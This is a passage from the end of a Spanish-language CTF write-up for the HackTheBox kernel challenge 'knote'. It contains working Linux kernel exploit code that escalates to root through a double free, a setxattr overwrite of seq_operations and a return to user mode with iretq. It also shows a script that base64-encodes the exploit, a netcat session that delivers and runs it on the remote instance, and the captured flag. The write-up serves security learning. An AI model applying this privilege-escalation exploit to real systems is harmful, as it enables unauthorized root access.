+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">mov r15, bak_cs;</span><span class="mtk4">"</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">push r15;</span><span class="mtk4">"</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">mov r15, bak_rip;</span><span class="mtk4">"</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">push r15;</span><span class="mtk4">"</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">iretq;</span><span class="mtk4">"</span>
+<span class="mtk1">                </span><span class="mtk4">"</span><span class="mtk1">.att_syntax;</span><span class="mtk4">"</span>
+<span class="mtk1">        );</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Observe que a pesar de que KASLR aparece habilitado en el <em>script</em> de <code>qemu</code>, mientras se depuraba, no estaba habilitado. Por lo tanto, no hay necesidad de obtener una fuga de memoria para saltar KASLR, podemos usar la dirección fija de <code>prepare_kernel_cred</code> y <code>commit_creds</code>.</p><p>En lugar de usar <code>create</code> para modificar los punteros de la estructura <code>seq_operations</code>, Podemos usar una forma más segura con <code>setxattr</code> (que también aparece en el <a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628">artículo japonés</a>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
+<span class="mtk1">        </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">shellcode_ptr </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1">shellcode;</span>
+
+<span class="mtk1">        </span><span class="mtk8">backup</span><span class="mtk1">();</span>
+<span class="mtk1">        </span><span class="mtk8">open_device</span><span class="mtk1">();</span>
+<span class="mtk1">        </span><span class="mtk8">bug</span><span class="mtk1">();</span>
+
+<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"[*] Creating seq_operations structure..."</span><span class="mtk1">);</span>
+<span class="mtk1">        seq_fd </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">"/proc/self/stat"</span><span class="mtk1">, O_RDONLY);</span>
+
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (seq_fd </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">                </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"[-] Error opening /proc/self/stat"</span><span class="mtk1">);</span>
+<span class="mtk1">                </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">        }</span>
+
+<span class="mtk1">        </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[*] Target function: </span><span class="mtk6">%p\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">shellcode);</span>
+
+<span class="mtk1">        </span><span class="mtk8">setxattr</span><span class="mtk1">(</span><span class="mtk4">"/proc/self/stat"</span><span class="mtk1">, </span><span class="mtk4">"exploit"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">shellcode_ptr, </span><span class="mtk6">32</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>  
+<span class="mtk1">        </span><span class="mtk8">read</span><span class="mtk1">(seq_fd, </span><span class="mtk6">NULL</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">);</span>
+
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Y en este punto usaremos <code>read</code> en descriptor de archivo de la estructura <code>seq_operations</code> para activar un puntero de la estructura, y así escalar privilegios a <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">~ $ /solve
+[*] Registers backed up
+[*] Triggering bug...
+[*] Triggering double free...
+[*] Creating seq_operations structure...
+[*] Target function: 0x401372
+[+] UID: 0
+/bin/sh: can't access tty; job control turned off  
+/home/user # cat /flag
+&lt;FLAG WILL BE HERE&gt;
+</code></pre></div><h2 id="_flag_"><em>Flag</em></h2><p>Ahora, vamos a por la instancia remota. Dado que hay poco tiempo, creé un <em>script</em> para copiar el <em>exploit</em> (comprimido y codificado en Base64) en el portapapeles con los comandos necesarios para ejecutarlo rápidamente:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env bash</span>
+
+<span class="mtk8">rm</span><span class="mtk1"> </span><span class="mtk4">solve</span><span class="mtk1"> </span><span class="mtk4">solve.gz</span><span class="mtk1"> </span><span class="mtk4">solve.gz.b64 <span class="mtk5">2&gt;</span>/dev/null</span>
+
+<span class="mtk8">musl-gcc</span><span class="mtk1"> </span><span class="mtk6">-o</span><span class="mtk1"> </span><span class="mtk4">solve</span><span class="mtk1"> </span><span class="mtk6">-static</span><span class="mtk1"> </span><span class="mtk4">../solve.c</span>
+<span class="mtk8">gzip</span><span class="mtk1"> </span><span class="mtk4">solve</span>
+<span class="mtk8">base64</span><span class="mtk1"> </span><span class="mtk4">solve.gz</span><span class="mtk1"> </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk4">solve.gz.b64</span>
+
+<span class="mtk5">for</span><span class="mtk1"> line </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk4">$(</span><span class="mtk8">cat</span><span class="mtk4"> solve.gz.b64)</span><span class="mtk1">; </span><span class="mtk5">do</span>
+<span class="mtk1">        </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"echo </span><span class="mtk1">$line</span><span class="mtk4"> &gt;&gt; solve.gz.b64"</span>
+<span class="mtk5">done</span>
+
+<span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"</span>
+<span class="mtk4">cat solve.gz.b64 | base64 -d &gt; solve.gz; gzip -d s</span><span class="mtk4">olve.gz; chmod +x solve; ./solve</span>  
+<span class="mtk4">"</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> 139.59.188.60 31283
+SeaBIOS (version rel-1.14.0-0-g155821a1990b-prebuilt.qemu.org)
+
+
+iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+07F8F130+07EEF130 CA00
+
+
+
+Booting from ROM...
+sh: can't access tty; job control turned off
+~ $ echo echo H4sICBvkf2QAA3NvbHZlAOxaf3xTVZZ/aZOSQuEFLVgckOg+3EZEGlakUTr0SSo37gOrtIpQHGeL >> solve.gz.b64  
+...
+~ $ echo U752f2OY/CO62X2aDq7P/7Fw+vpfyvMHdXA97uFh8v+O5//x9+TP0V3ZF99oWsE3SHAc1QoZ/mnj >> solve.gz.b64
+~ $ echo CtcdT3cIcsVv2N2jO9mqL3/MMPm3/IHdjd/T//8LmQbrlUivAAA= >> solve.gz.b64
+~ $
+~ $ cat solve.gz.b64 | base64 -d > solve.gz; gzip -d solve.gz; chmod +x solve; ./solve
+[*] Registers backed up
+[*] Triggering bug...
+[*] Triggering double free...
+[*] Creating seq_operations structure...
+[*] Target function: 0x401372
+[+] UID: 0
+/bin/sh: can't access tty; job control turned off
+/home/user # cat /flag
+cat /flag
+HTB{2cdbf36398470b5428ea991d18502ef2}
+</code></pre></div><p>El <em>exploit</em> completo se puede encontrar aquí: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/knote/solve.c"><code>solve.c</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#análisis-de-código-fuente">Análisis de código fuente</a><ul><li><a href="#función-de-asignación">Función de asignación</a></li><li><a href="#función-de-liberación">Función de liberación</a></li><li><a href="#función-de-información">Función de información</a></li></ul></li><li><a href="#configuración-del-entorno">Configuración del entorno</a></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail">
+<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="TinyLetter">TinyLetter</a></p><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
